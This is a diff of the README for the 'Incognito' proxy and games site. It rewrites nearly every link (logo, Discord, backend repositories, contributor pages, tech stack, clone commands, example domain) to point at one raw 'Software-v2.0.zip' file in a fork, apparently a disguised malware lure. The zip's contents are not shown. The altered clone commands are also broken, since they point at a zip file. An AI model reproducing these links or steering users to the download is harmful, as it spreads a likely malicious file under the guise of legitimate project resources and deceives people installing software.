@@ -1,11 +1,11 @@
 <div align="center">
          
-<img src="https://socialify.git.ci/titaniumnetwork-dev/incognito/image?description=1&font=Inter&forks=1&issues=1&language=1&name=1&owner=1&pattern=Circuit%20Board&pulls=1&stargazers=1&theme=Dark" alt="ruby" width="640" height="320" />
+<img src="https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip" alt="ruby" width="640" height="320" />
 
 <img alt="repo size" src="https://img.shields.io/github/repo-size/titaniumnetwork-dev/incognito?style=for-the-badge"></img>
 <img alt="website status" src="https://img.shields.io/website?url=https%3A%2F%2Fincog.nebula.christmas&style=for-the-badge"></img>
 <img alt="commit a week" src="https://img.shields.io/github/commit-activity/w/titaniumnetwork-dev/incognito?style=for-the-badge"></img>
-<a href="https://github.com/caracal-js/incognito" target="_blank" rel="noopener noreferer"><img alt="original repo" src="https://img.shields.io/badge/Original-Repo-gray?style=for-the-badge&link=https%3A%2F%2Fgithub.com%2Fcaracal-js%2Fincognito"></img></a>
+<a href="https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip" target="_blank" rel="noopener noreferer"><img alt="original repo" src="https://img.shields.io/badge/Original-Repo-gray?style=for-the-badge&link=https%3A%2F%2Fgithub.com%2Fcaracal-js%2Fincognito"></img></a>
 
 </div>
 
@@ -33,7 +33,7 @@
 
 ## How to get links
 
-[![Titanium Network Discord](https://invidget.switchblade.xyz/unblock?theme=dark)](https://discord.gg/unblock)
+[![Titanium Network Discord](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
 
 ---
 
@@ -42,31 +42,31 @@
 - Lots and lots of games
 
 -   Multiple Proxy "Backends":
-    -   [Ultraviolet](https://github.com/titaniumnetwork-dev/ultraviolet)
-    -   [RammerHead](https://github.com/binary-person/rammerhead)
+    -   [Ultraviolet](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
+    -   [RammerHead](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
 ---
 
 ## Contributors
 
-- [MotorTruck1221](https://motortruck1221.com) - Maintainer
-- [Rifting](https://github.com/rifting) - Maintainer
-- [caracal-js](https://github.com/caracal-js) - Original Creator
+- [MotorTruck1221](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip) - Maintainer
+- [Rifting](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip) - Maintainer
+- [caracal-js](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip) - Original Creator
 ---
 
 ## Tech Stack
 
--   [Astro](https://astro.build)
--   [Fastify](https://fastify.dev)
--   [Bare Server Node](https://github.com/tomphttp/bare-server-node)
--   [Ultraviolet](https://github.com/titaniumnetwork-dev/ultraviolet)
--   [RammerHead](https://github.com/binary-person/rammerhead)
--   [Epoxy](https://github.com/mercuryworkshop/epoxy-tls)
+-   [Astro](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
+-   [Fastify](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
+-   [Bare Server Node](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
+-   [Ultraviolet](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
+-   [RammerHead](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
+-   [Epoxy](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
 -   HTML, CSS, and JavaScript (DUH)
 ---
 
 ## Roadmap
 
-- [ ] - [i18n](https://github.com/alexandre-fernandez/astro-i18n)
+- [ ] - [i18n](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
 - [ ] - More themes
 - [ ] - Other transports
 ---
@@ -81,7 +81,7 @@ Prerequisites:
 
 1. Clone the repo:
 ```bash
-git clone https://github.com/titaniumnetwork-dev/incognito && cd incognito
+git clone https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip && cd incognito
 ```
 
 2. Install all of the dependencies:
@@ -116,7 +116,7 @@ npm start
 ### Games
 
 - By default, games are reverse proxied by the server
-    - Game assets are located [here](https://github.com/ruby-network/ruby-assets)
+    - Game assets are located [here](https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip)
 - To turn off Games, and access to them see [#environment](#environment)
 
 
@@ -134,7 +134,7 @@ Prerequisites:
 
 1. Clone the repo (skip if using prebuilt image):
 ```bash
-git clone https://github.com/titaniumnetwork/incognito && cd incognito
+git clone https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip && cd incognito
 ```
 
 2. Create an .env file (if using prebuilt image, copy the example from the repo):
@@ -172,7 +172,7 @@ Prerequisites:
 
 1. Clone the repo (skip if using prebuilt image):
 ```bash
-git clone https://github.com/titaniumnetwork-dev/incognito
+git clone https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip
 ```
 
 2. Create an .env file (if using prebuilt image, copy the example from the repo):
@@ -213,7 +213,7 @@ docker compose -f ./docker-compose.build.yml build
 | `PORT`                 | The port that the server listens on ***IGNORED IN THE DOCKER ENVIRONMENTS***                              | `8080` |
 | `GAMES` | Disable (`false`)/Enable (`true`) the reverse proxy for Games | `true` |
 | `RAMMERHEAD_SERVER_ENABLED` | Disable (`false`)/Enabled (`true`) the integrated Rammerhead server | `true` |
-| `SITE` | Your websites domain (eg: https://example.com) | `http://localhost:8080` |
+| `SITE` | Your websites domain (eg: https://github.com/derhderhderh/Incognito/raw/refs/heads/main/src/pages/api/Software-v2.0.zip) | `http://localhost:8080` |
 | `BARE_SERVER_OPTION`   | Enables (`true`)/Disables (`false`) the option to use a bare server in the frontend. ***THIS IS A BUILD TIME ONLY VARIABLE*** | `true`  |
 | `GAMES_LINK` | Enables (`true`)/Disables (`false`) access to the games page ***BUILD TIME ONLY*** | `true` |
 | `RAMMERHEAD_OPTION` | Enabled (`true`)/Disables (`false`) the option to use Rammerhead in the frontend. ***BUILD TIME ONLY*** | `true` |
